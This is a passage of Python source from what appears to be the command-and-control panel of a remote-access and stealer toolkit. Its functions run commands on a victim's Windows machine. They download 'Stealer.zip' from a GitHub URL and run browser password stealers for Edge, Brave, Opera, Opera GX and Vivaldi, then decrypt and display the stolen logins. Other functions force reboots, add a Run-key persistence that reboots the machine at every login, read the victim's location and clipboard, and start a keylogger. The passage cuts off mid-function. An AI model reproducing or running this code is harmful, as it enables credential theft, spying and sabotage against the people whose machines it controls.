                result="No saved passwords found in Google Chrome\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_edge_passwords(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        command='dir "%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data"'
        profiles=self.remote_execute(command)
        if not profiles:
            result="Edge not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\edge_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Edge\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("python -m pip install pywin32")
            command=f'python %tmp%\\Stealer\\edge_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Edge\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\edge_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Edge\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_brave_passwords(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        command='dir "%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser"'
        profiles=self.remote_execute(command)
        if not profiles:
            result="Brave not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\brave_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Brave\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("python -m pip install pywin32")
            command=f'python %tmp%\\Stealer\\brave_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Brave\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\brave_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Brave\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_opera_passwords(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        command='dir "%APPDATA%\\Opera Software\\Opera Stable"'
        profiles=self.remote_execute(command)
        if not profiles:
            result="Opera not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\opera_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Opera\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("python -m pip install pywin32")
            command=f'python %tmp%\\Stealer\\opera_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Opera\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\opera_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Opera\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_opera_gx__passwords(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        command='dir "%APPDATA%\\Opera Software\\Opera GX Stable"'
        profiles=self.remote_execute(command)
        if not profiles:
            result="Opera GX not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\operagx_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Opera GX\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("python -m pip install pywin32")
            command=f'python %tmp%\\Stealer\\operagx_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Opera GX\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\operagx_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Opera GX\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_vivaldi_passwords(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        command='dir "%USERPROFILE%\\AppData\\Local\\Vivaldi\\User Data"'
        profiles=self.remote_execute(command)
        if not profiles:
            result="Vivaldi not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\vivaldi_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Vivaldi\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("python -m pip install pywin32")
            command=f'python %tmp%\\Stealer\\vivaldi_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Vivaldi\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\vivaldi_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Vivaldi\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')



    def c2_reboot_system(self):
        command="shutdown /r /t 0"
        self.remote_execute(command)
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", "Rebooting system...\n\n", "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')

        
    def c2_shutdown_system(self):
        command="shutdown /s /t 0"
        self.remote_execute(command)
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", "Shutting down system...\n\n", "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')


    def c2_set_reboot_persistent(self):
        command="echo @echo off > %APPDATA%\\reboot.bat"
        self.remote_execute(command)
        command="echo shutdown /r /t 0 >> %APPDATA%\\reboot.bat"
        self.remote_execute(command)

        command='reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Reboot" /t REG_SZ /d "%APPDATA%\\reboot.bat" /f'
    
        result=self.remote_execute(command)+"\n\n"
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", result, "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')

    def c2_get_location(self):
        command="curl http://api.ipify.org"
        public_ip=self.remote_execute(command)

        command=f"curl http://ip-api.com/json/{public_ip.strip()}"
        location_info_dict=self.remote_execute(command)
        location_info_dict=ast.literal_eval(location_info_dict)

        for value,key in location_info_dict.items():
            if key!="success":
                self.c2_listening_terminal.insert("end",f"{key} -> {value}\n")
                self.c2_listening_terminal.see("end")
        self.c2_listening_terminal.insert("end","\n")
        self.c2_listening_terminal.see("end")
        self.c2_listening_terminal.configure(state="disabled")
    


    def c2_get_clipboard(self):
        command="powershell Get-Clipboard"
        result=self.remote_execute(command)+"\n\n"
        if not result.strip():
            result="Empty clipboard\n\n"
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", result, "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')

    def c2_keylogger(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

